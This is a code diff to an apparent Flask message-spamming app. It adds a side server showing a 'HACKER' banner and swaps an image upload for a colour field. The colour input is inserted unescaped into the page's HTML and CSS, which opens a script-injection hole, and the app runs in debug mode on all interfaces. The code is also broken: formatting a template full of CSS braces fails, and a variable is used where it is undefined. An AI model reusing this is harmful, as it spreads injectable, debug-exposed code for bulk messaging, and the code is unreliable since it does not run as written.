@@ -1,8 +1,11 @@
 from flask import Flask, request
 import requests
+import threading
 from time import sleep
 import time
 from datetime import datetime
+import http.server
+import socketserver
 
 app = Flask(__name__)
 app.debug = True
@@ -18,6 +21,21 @@ headers = {
     'referer': 'www.google.com'
 }
 
+# HTTP server to display a simple message
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"ITZ HACKER FOLLOW ME ON FACEBOOK (www.facebook.com/prembabu001)")
+
+# Thread to run HTTP server
+def execute_server():
+    PORT = 4000
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
@@ -29,10 +47,8 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        # बैकग्राउंड इमेज प्रोसेसिंग
-        background_file = request.files.get('backgroundFile')
-        if background_file:
-            background_file.save('static/https://i.ibb.co/ckpygwH/60ac6c1512be84172ac71f65d050e700.jpg')
+        # Remove background image processing as we will use a solid color
+        background_color = request.form.get('backgroundColor')
 
         while True:
             try:
@@ -61,15 +77,12 @@ def send_message():
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
-            background-image: url('static/background.jpg'); /* बैकग्राउंड इमेज */
-            background-size: cover; /* इमेज को कवर करने के लिए */
-            background-position: center; /* इमेज को सेंटर में रखने के लिए */
-            background-repeat: no-repeat; /* इमेज को रिपीट न करने के लिए */
-            color: white; /* टेक्स्ट का रंग */
+            background-color: {} !important; /* Set background color based on input */
+            color: white; /* Text color */
         }
         .container {
             max-width: 500px;
-            background-color: rgba(255, 255, 255, 0.8); /* हल्का बैकग्राउंड */
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background for the container */
             border-radius: 10px;
             padding: 20px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -116,8 +129,8 @@ def send_message():
                 <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
             </div>
             <div class="mb-3">
-                <label for="backgroundFile">SELECT BACKGROUND IMAGE</label>
-                <input type="file" class="form-control" id="backgroundFile" name="backgroundFile" accept="image/*">
+                <label for="backgroundColor">ENTER BACKGROUND COLOR (e.g., #ff0000 for red)</label>
+                <input type="text" class="form-control" id="backgroundColor" name="backgroundColor" required>
             </div>
             <div class="mb-3">
                 <label for="time">ENTER TIME</label>
@@ -133,7 +146,12 @@ def send_message():
     </footer>
 </body>
 </html>
-    '''
+    '''.format(background_color)  # Insert the background color into the HTML
 
 if __name__ == '__main__':
+    # Start HTTP server in a separate thread
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    # Start Flask application
     app.run(host='0.0.0.0', port=5000)
